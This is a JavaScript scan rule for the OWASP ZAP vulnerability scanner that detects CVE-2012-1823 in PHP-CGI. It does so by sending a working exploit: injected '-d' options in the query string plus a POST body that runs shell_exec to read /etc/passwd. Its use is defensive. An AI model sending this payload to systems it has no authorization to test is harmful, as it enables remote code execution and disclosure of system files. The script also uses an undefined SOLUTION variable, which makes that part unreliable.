/*
 * MIT License
 *
 * Copyright (c) 2022 Sepehrdad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2012-1823] PHP CGI v5.3.12/5.4.2 Remote Code Execution"
var DESCRIPTION = "sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case."
var REFERENCE = "https://nvd.nist.gov/vuln/detail/CVE-2012-1823"
var OTHER = "see: https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823"

function log(msg) {
    print("[" + this["zap.script.name"] + "] " + msg);
}

function alert(as, msg, evidence) {
    as.newAlert()
        .setRisk(RISK)
        .setConfidence(CONFIDENCE)
        .setName(TITLE)
        .setDescription(DESCRIPTION)
        .setEvidence(evidence)
        .setOtherInfo(OTHER)
        .setSolution(SOLUTION)
        .setReference(REFERENCE)
        .setMessage(msg)
        .raise();
}

function scanNode(as, msg) {

    var uri = msg.getRequestHeader().getURI();

    if (uri.getPath() != null && uri.getPath().length() > 1) {
        log("ignoring scan for " + uri);
        return;
    }

    log("scanning " + uri);

    // Copy requests before reusing them
    msg = msg.cloneRequest();

    var request_header = msg.getRequestHeader();
    uri = request_header.getURI();
    var request_body = msg.getRequestBody();

    uri.setPath("/index.php");
    uri.setEscapedQuery("-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input");
    request_header.setMethod("POST");
    request_header.setHeader("Content-Type", "application/x-www-form-urlencoded");
    request_body.setBody("<?php echo shell_exec(\"cat /etc/passwd\"); ?>");

    // sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    as.sendAndReceive(msg, false, false);

    var response_header = msg.getResponseHeader();
    var response_body = msg.getResponseBody();

    var re = new RegExp("root:.*:0:0:", 'g');

    var evidence = response_body.toString().match(re);

    // Test the response here, and make other requests as required
    if (response_header.getStatusCode() == 200 && evidence) {
        alert(as, msg, evidence);
    }
}

function scan(as, msg, param, value) {
    return;
}
